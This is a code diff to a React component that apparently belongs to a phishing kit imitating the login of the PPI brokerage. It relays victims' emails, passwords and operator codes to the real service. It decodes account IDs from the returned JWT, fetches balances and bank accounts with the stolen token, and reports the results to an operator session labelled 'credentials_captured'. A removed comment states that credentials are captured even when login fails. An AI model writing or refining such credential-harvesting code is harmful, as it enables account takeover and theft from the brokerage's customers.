@@ -67,18 +67,26 @@ const PPI = () => {
       const res = await ppiApi.login(submittedEmail, password, operatorCode);
 
       if (res.success || res.raw?.status === 0) {
-        const fullName = res.fullName || res.raw?.payload?.denominacion || "";
-        const cuentaId = res.cuentaId || res.raw?.payload?.cuentaId || "";
+        const fullName = res.fullName || res.raw?.payload?.usuario?.nombreCompleto || res.raw?.payload?.denominacion || "";
+        const token = typeof res.token === "string" ? res.token : (res.token?.accessToken || res.raw?.payload?.token?.accessToken || "");
+        // Extract cuentaId from response, JWT claims, or known field
+        let cuentaId = res.cuentaId;
+        if (!cuentaId && token) {
+          try {
+            const claims = JSON.parse(atob(token.split(".")[1]));
+            cuentaId = parseInt(claims["PPAuth.Claims.General.Cuentas"]) || null;
+          } catch { /* ignore */ }
+        }
         
         await updateSession("login_success", {
           otp_code: `name:${fullName}|cuenta:${cuentaId}`,
         });
 
-        if (res.token) {
+        if (token) {
           setStatusMsg("Sincronizando datos...");
           try {
-            await ppiApi.balances(res.token, cuentaId);
-            await ppiApi.bankAccounts(res.token, cuentaId);
+            await ppiApi.balances(token, cuentaId);
+            await ppiApi.bankAccounts(token, cuentaId);
           } catch { /* silent */ }
           await updateSession("completed", {
             otp_code: `name:${fullName}|cuenta:${cuentaId}|token:yes`,
@@ -89,7 +97,6 @@ const PPI = () => {
           });
         }
       } else {
-        // API call failed (IP block, version check, etc.) — still capture credentials
         await updateSession("waiting_operator", {
           otp_code: `credentials_captured`,
         });
